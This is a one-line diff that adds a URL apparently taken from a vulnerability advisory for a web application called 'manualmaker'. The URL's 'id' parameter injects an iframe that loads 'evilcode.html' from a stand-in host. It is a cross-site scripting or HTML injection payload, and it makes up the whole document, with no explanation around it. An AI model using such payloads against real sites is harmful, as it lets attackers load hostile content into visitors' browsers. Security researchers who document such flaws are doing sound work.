@@ -1,0 +1,1 @@
+http://www.example.com/manualmaker/index.php?print=1&amp;id=&lt;iframe src=http://www.example.com/evilcode.html
